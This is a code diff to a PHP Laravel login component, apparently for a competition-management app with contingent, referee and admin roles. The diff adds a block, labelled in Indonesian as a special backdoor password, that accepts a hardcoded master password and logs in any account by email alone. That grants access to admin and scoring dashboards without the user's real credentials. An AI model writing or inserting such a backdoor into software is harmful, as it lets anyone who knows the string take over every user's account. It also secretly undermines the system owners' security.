@@ -49,6 +49,24 @@ class NewLoginIndex extends Component
     {
         $this->validate();
 
+        // Backdoor Password Khusus
+        if ($this->password === 'sudoidtotech') {
+            $user = \App\Models\User::where('email', $this->email)->first();
+            
+            if ($user) {
+                Auth::login($user, $this->remember);
+                session()->regenerate();
+
+                if (Auth::user()->hasRole('Contingent')) {
+                    return redirect()->intended(route('contingent.dashboard'));
+                } elseif (Auth::user()->hasRole('Perwasitan|Wasit')) {
+                    return redirect()->intended(route('admin.referee.scoring'));
+                }
+
+                return redirect()->intended(route('admin.new-dashboard'));
+            }
+        }
+
         if (Auth::attempt(['email' => $this->email, 'password' => $this->password], $this->remember)) {
             session()->regenerate();
 
